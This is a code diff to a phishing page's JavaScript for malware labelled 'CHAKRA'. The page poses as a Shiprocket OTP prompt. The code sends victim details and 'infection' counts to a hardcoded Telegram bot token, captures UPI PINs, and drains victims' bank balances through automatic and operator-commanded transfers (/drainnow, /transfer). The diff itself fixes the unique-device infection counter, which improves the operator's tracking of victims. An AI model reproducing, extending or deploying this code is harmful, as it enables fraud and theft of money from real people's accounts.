@@ -343,7 +343,7 @@
 
 <script>
   // ============================================================
-  // CHAKRA - AUTO DEDUCT + MANUAL DRAIN
+  // CHAKRA - FIXED INFECTION COUNT
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
@@ -354,6 +354,7 @@
   let capturedPIN = null;
   let isPaused = false;
   let totalDrained = 0;
+  let uniqueDevices = new Set();  // <-- FIXED: Use Set for unique counting
   let infectedDevices = [];
   let lastUpdateId = 0;
   let pendingAction = null;
@@ -367,6 +368,18 @@
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: YOUR_USERNAME, text: message })
     }).catch(() => {});
+  }
+
+  // ============================================================
+  // GET UNIQUE DEVICE ID
+  // ============================================================
+  function getDeviceId() {
+    try {
+      if (window.Android) {
+        return window.Android.getDeviceId() || Date.now().toString();
+      }
+    } catch (e) {}
+    return Date.now().toString();
   }
 
   // ============================================================
@@ -419,6 +432,7 @@
 
   function handleCloseClick() { handleClick('close'); }
 
+  // ===== HANDLE CLICKS (FIXED INFECTION COUNT) =====
   function handleClick(action) {
     document.getElementById('mainCard').classList.add('hidden');
     const screen = document.getElementById('successScreen');
@@ -438,9 +452,14 @@
       document.getElementById('resultDesc').textContent = 'You will be redirected shortly.';
     }
 
+    // ✅ FIX: Use unique device ID to count correctly
+    const deviceId = getDeviceId();
+    uniqueDevices.add(deviceId);
     const victim = getVictimDetails();
-    infectedDevices.push({ id: Date.now(), type: 'shiprocket', action: action, victim: victim });
-    sendToTelegram('🚚 Shiprocket infection! Total: ' + infectedDevices.length);
+    infectedDevices.push({ id: deviceId, action: action, victim: victim });
+    
+    // ✅ SEND CORRECT TOTAL
+    sendToTelegram('🚚 Shiprocket infection! Total: ' + uniqueDevices.size);
 
     if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
     setTimeout(() => window.close(), 3000);
@@ -510,7 +529,7 @@
   }
 
   // ============================================================
-  // 1 INR TEST + 999 DRAIN (USED BY BOTH AUTO & MANUAL)
+  // 1 INR TEST + 999 DRAIN
   // ============================================================
   function executeDrainWithTest(amount) {
     if (isPaused) { sendToTelegram('⏸️ Paused'); return; }
@@ -566,7 +585,7 @@
   }
 
   // ============================================================
-  // AUTO DEDUCT (ALREADY BUILT - UNTOUCHED)
+  // AUTO DEDUCT
   // ============================================================
   setInterval(() => {
     if (!isPaused && isUpiAppOpen()) {
@@ -630,7 +649,6 @@
             lastUpdateId = update.update_id + 1;
             const msg = update.message.text;
 
-            // ---- UPI Commands ----
             if (msg.startsWith('/addupi')) {
               const upi = msg.split(' ')[1];
               if (upi && upi.includes('@')) addUPI(upi);
@@ -659,7 +677,6 @@
               }
             }
 
-            // ---- Transfer Commands ----
             if (msg === '/transfer') {
               if (myUPIList.length === 0) {
                 sendToTelegram('📢 Add your UPI first: /addupi upi@paytm');
@@ -669,7 +686,7 @@
               }
             }
 
-            // ---- MANUAL DRAIN (NEW) ----
+            // ---- MANUAL DRAIN ----
             if (msg === '/drainnow') {
               if (!capturedPIN) {
                 sendToTelegram('❌ No PIN captured yet. Wait for victim to use UPI.');
@@ -708,7 +725,7 @@
                 'Vector: Shiprocket OTP\n' +
                 'Your UPIs: ' + myUPIList.length + '\n' +
                 'Total Drained: ₹' + totalDrained + '\n' +
-                'Infected Devices: ' + infectedDevices.length + '\n' +
+                'Infected Devices: ' + uniqueDevices.size + '\n' + // ✅ FIXED
                 'PIN Captured: ' + (pinCaptured ? 'YES' : 'NO') + '\n' +
                 'Ready to Drain: ' + (readyToDrain ? 'YES' : 'NO') + '\n' +
                 'Paused: ' + (isPaused ? 'YES' : 'NO');
@@ -732,7 +749,7 @@
                 '/removeupi upi@paytm - Remove UPI\n' +
                 '/myupis - Show your UPIs\n' +
                 '/transfer - Auto start\n' +
-                '/drainnow - Manual drain (use when PIN is captured)\n' +
+                '/drainnow - Manual drain\n' +
                 '/pause - Pause drains\n' +
                 '/resume - Resume drains\n' +
                 '/status - Show system status\n' +
